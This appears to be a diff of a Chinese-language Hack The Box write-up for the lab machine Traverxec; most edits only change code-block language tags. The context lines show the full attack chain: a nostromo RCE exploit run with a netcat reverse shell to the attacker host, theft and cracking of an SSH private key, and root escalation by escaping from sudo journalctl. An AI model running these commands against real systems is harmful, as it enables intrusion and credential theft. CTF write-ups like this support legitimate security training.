@@ -20,7 +20,7 @@ tags:
 
 1. 首先使用 nmap 扫描目标靶机
 
-```bash
+```shell
 root@kali:~# nmap -A 10.10.10.165
 Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-02 22:25 CST
 Nmap scan report for 10.10.10.165
@@ -109,7 +109,7 @@ nostromo nhttpd 存在版本漏洞，可以远程执行命令，这里可以有�
 
 在本机监听 4444 端口，利用 exp 反弹 bash 回 kali 攻击机，获得靶机 shell
 
-```cmd
+```shell
 root@kali:~/CVE/CVE-2019-16278# ./CVE-2019-16278.sh 10.10.10.165 80 nc -e /bin/bash 10.10.15.44 4444
 
 root@kali:~/CVE/CVE-2019-16278# nc -lvnp 4444
@@ -129,7 +129,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 **Tips:** 之后为了得到一个更好的用的 shell 可以按 **Ctrl + z** 挂起任务，之后输入 **stty raw -echo** .  然后输入 **fg** 将任务回到前台，这样我们就可以在 shell 中使用上下键回到上一条命令并利用 tab 补全命令。
 
-```cmd
+```shell
 python -c 'import pty;pty.spawn("/bin/bash")';
 www-data@traverxec:/usr/bin$ ^Z
 [1]+  已停止               nc -lvnp 4444
@@ -138,7 +138,7 @@ root@kali:~/CVE/CVE-2019-16278# nc -lvnp 4444
                                              pwd
 /usr/bin
 www-data@traverxec:/usr/bin$ id
-uid=33(www-data) gid=33(www-data) groups=33(www-data
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 > 反弹 shell 的一些技术文章
@@ -153,14 +153,14 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data
 
 更新 msf
 
-```bash
+```shell
 $ apt update
 $ apt install metasploit-framework
 ```
 
 搜索漏洞并利用：
 
-```cmd
+```sh
 root@kali:~# msfconsole
 [-] ***rting the Metasploit Framework console.../
 [-] * WARNING: No database support: could not connect to server: Connection refused
@@ -259,7 +259,7 @@ pwd
 
 在 /home 目录下发现疑似 user 的文件夹，但没有权限读取其目录
 
-```cmd
+```shell
 www-data@traverxec:/usr/bin$ cd /home
 www-data@traverxec:/home$ ls
 david
@@ -271,7 +271,7 @@ www-data@traverxec:/home/david$
 
 这时候可以去找配置文件和证书文件等，我们在 **/var/nostromo/conf** 目录下发现了 nostromo 的配置文件
 
-```cmd
+```shell
 www-data@traverxec:/home/david$ cd /var/nostromo/conf/
 www-data@traverxec:/var/nostromo/conf$ ls
 mimes  nhttpd.conf
@@ -311,7 +311,7 @@ homedirs_public		public_www
 
 发现在 /home 目录下存在 public_www 的文件夹，但之前查看 /home 的目录时没有找到，猜想 public_www 存在 david 文件下，尝试 cd 进去
 
-```cmd
+```vb
 www-data@traverxec:/var/nostromo/conf$ cd /home/david/public_www
 www-data@traverxec:/home/david/public_www$ ls
 index.html  protected-file-area
@@ -321,7 +321,7 @@ www-data@traverxec:/home/david/public_www/protected-file-area$ ls backup-ssh-ide
 
 其中有 ssh 密钥的备份文件压缩包 backup-ssh-identity-files.tgz, 可以通过 base64 将其拷贝到本地 kali
 
-```cmd
+```vb
 $ base64 backup-ssh-identity-files.tgz                       
 H4sIAANjs10AA+2YWc+jRhaG+5pf8d07HfYtV8O+Y8AYAzcROwabff/1425pNJpWMtFInWRm4uem
 gKJ0UL311jlF2T4zMI2Wewr+OI4l+Ol3AHpBQtCXFibxf2n/wScYxXGMIGCURD5BMELCyKcP/Pf4
@@ -361,7 +361,7 @@ e/PmzZs3b968efPmzZs3b968efPmzf8vfweR13qfACgAAA==
 
 之后用 `base64 -d` 在本地还原 .tgz
 
-```cmd
+```shell
 root@kali:~# echo "H4sIAANjs10AA+2YWc+jRhaG+5pf8d07HfYtV8O+Y8AYAzcROwabff/1425pNJpWMtFInWRm4uem
 > gKJ0UL311jlF2T4zMI2Wewr+OI4l+Ol3AHpBQtCXFibxf2n/wScYxXGMIGCURD5BMELCyKcP/Pf4
 > mG+ZxykaPj4+fZ2Df/Peb/X/j1J+o380T2U73I8s/bnO9vG7xPgiMIFhv6o/AePf6E9AxEt/6LtE
@@ -400,7 +400,7 @@ root@kali:~# echo "H4sIAANjs10AA+2YWc+jRhaG+5pf8d07HfYtV8O+Y8AYAzcROwabff/1425pN
 
 解压 sshbackup.tgz，发现 david 的 ssh 密钥
 
-```cmd
+```shell
 root@kali:~# tar -zxvf sshbackup.tgz
 home/david/.ssh/
 home/david/.ssh/authorized_keys
@@ -410,7 +410,7 @@ home/david/.ssh/id_rsa.pub
 
 使用 ssh2jhon 对 passphrase 进行爆破
 
-```cmd
+```shell
 root@kali:~/home/david/.ssh# ls
 authorized_keys  id_rsa  id_rsa.pub
 root@kali:~/home/david/.ssh# ssh2john id_rsa > davidhash
@@ -434,7 +434,7 @@ hunter           (id_rsa)
 
 使用 ssh 登录获得 user 权限，读取 user.txt
 
-```cmd
+```shell
 root@kali:~# ssh -i ./home/david/.ssh/id_rsa david@traverxec.htb
 ssh: Could not resolve hostname traverxec.htb: Name or service not known
 root@kali:~# ssh -i ./home/david/.ssh/id_rsa david@10.10.10.165
@@ -449,7 +449,7 @@ bin  public_www  user.txt
 
 当进行提权时，注意到的第一件事是 david 的主目录中有一个 bin 目录，该目录中有一个名为 server-stats.sh 的文件。
 
-```cmd
+```shell
 david@traverxec:/bin$ cd
 david@traverxec:~$ cd bin
 david@traverxec:~/bin$ ls
@@ -482,7 +482,7 @@ Jan 02 11:14:51 traverxec crontab[2855]: (www-data) LIST (www-data)
 
 journalctl 是一个收集服务日志的服务
 
-```cmd
+```shell
 david@traverxec:~/bin$ cat server-stats.sh 
 #!/bin/bash
 
@@ -500,7 +500,7 @@ echo "Last 5 journal log lines:"
 
 执行最后一条命令，注意此时 terminal 的窗口必须尽可能的小才能执行命令（或者使用 `less` 命令），执行 `!/bin/sh`，获得 root 权限。
 
-```cmd
+```shell
 david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
 -- Logs begin at Thu 2020-01-02 10:14:54 EST, end at Thu 2020-01-02 11:21:37 EST
 Jan 02 11:14:48 traverxec sudo[2762]: pam_unix(sudo:auth): authentication failur
